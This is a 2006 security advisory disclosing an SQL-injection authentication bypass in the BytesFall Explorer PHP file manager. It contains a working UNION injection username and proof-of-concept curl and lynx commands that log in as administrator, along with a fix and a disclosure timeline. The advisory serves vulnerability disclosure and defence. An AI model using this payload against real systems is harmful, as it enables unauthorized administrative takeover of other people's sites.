Subject: Authentication bypass in BytesFall Explorer

Advisory: Authentication bypass in BytesFall Explorer

A malicious user can bypass authentication and take over the role of the
administrator of BytesFall Explorer by using an SQL injection. Several other
SQL injections are possible.


Details
=======

Product: BytesFall Explorer
Affected Versions: <= 0.0.7.1
Fixed Versions: 0.0.7.2
Vulnerability Type: SQL injection
Security-Risk: medium 
Vendor-URL: http://bfexplorer.sourceforge.net
Vendor-Status: informed, fixed version released
Advisory-URL: http://www.redteam-pentesting.de/advisories/rt-sa-2006-007.txt
Advisory-Status: private
CVE: CVE-2006-nnnn 
CVE-URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-nnnn


Introduction
============

BytesFall Explorer is a web-based file manager programmed in PHP and 
JavaScript
and licensed under the GNU GPL. It allows to upload, download, view, edit,
copy, move/rename and change permissions of a single file/directory or a group
of files/directories.


More Details
============

Because of missing user input sanitizations a malicious user can modify an SQL
query in login/doLogin.php, line 13:

13   $User = bfRecord(sprintf("SELECT * FROM %susers WHERE username='%s';",
$tables_preffix, $username));

By using the username

' union select
1,'','','admin',$1$ol0uK1m4$gDzEIJEpe5Tj7G/f9Jite/,1,'','','','' from
bfe_users where ''='

and password 'redteam' a user can login and take over the role of the
administrator of BytesFall Explorer.

Many other SQL injections in other files exist that can be exploited.


Proof of Concept
================

Using curl:

curl -i http://www.example.com/bfExplorer/login/doLogin.php --data-binary
"username=' union select
1,'','','admin','\$1\$0NLmbQHB\$jHKubCw0LcN82fIVr6o7V0',1,'','','','' from
bfe_users where ''='&Login=Login&password=redteam"

or lynx:

printf "username=' union select
1,'','','admin','\$1\$0NLmbQHB\$jHKubCw0LcN82fIVr6o7V0',1,'','','','' from
bfe_users where ''='&Login=Login&password=redteam\n---" | lynx --post_data
http://www.example.com/bfExplorer/login/doLogin.php


Workaround
==========

Use PHP Magic Quotes.


Fix
===

Use PHP's mysql_escape_string() to sanitize variables containing user
input before using them in MySQL queries. A fixed version 0.0.7.2 of BytesFall
Explorer is available.

Security Risk
=============

RedTeam considers the security risc medium. BytesFall Explorer can be
compromised totally when PHP Magic Quotes are not enabled. Though Magic Quotes
do not represent real security, they are a workaround for these problems.


History
=======

2006-10-06 Discovery of the vulnerabilities
2006-10-06 Vendor is informed
2006-10-06 Vendor releases fixed version
